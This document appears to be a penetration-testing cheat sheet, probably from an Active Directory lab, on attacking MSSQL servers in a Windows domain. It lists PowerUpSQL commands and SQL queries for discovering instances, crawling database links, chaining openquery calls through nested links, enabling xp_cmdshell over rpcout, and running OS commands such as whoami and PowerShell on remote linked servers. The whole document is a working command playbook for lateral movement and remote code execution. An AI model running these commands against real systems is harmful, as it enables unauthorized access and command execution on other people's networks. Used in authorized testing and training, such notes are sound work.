# MSSQL Servers

* MS SQL servers are generally deployed in plenty in a Windows domain.
* SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
* For MSSQL and PowerShell hackery, lets use [PowerUpSQL](https://github.com/NetSPI/PowerUpQL)

* Discovery (SPN Scanning)
```
Get-SQLInstanceDomain
```

* Check Accessibility :
```
Get-SQLConnectionTestThreaded
```

```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

* Gather Information :
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```


# Database Links

* A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
* In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
* Database links work even across forest trusts.

Searching Database Links
* Look for links to remote servers
```
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```
OR
```
select * from master..sysservers
```

Enumerating Database Links - Manually

* Openquery() function can be used to run queries on a linked database
```
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

* Enumerating Database Links
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```
OR
* Openquery queries can be chained to access links within links (nested links)
```
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
```

Executing Commands
*  On the target server, either xp_cmdshell should be already enabled; or
* If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

* Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
```

* From the initial SQL server, OS commands can be executed using nested link queries:
```
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```
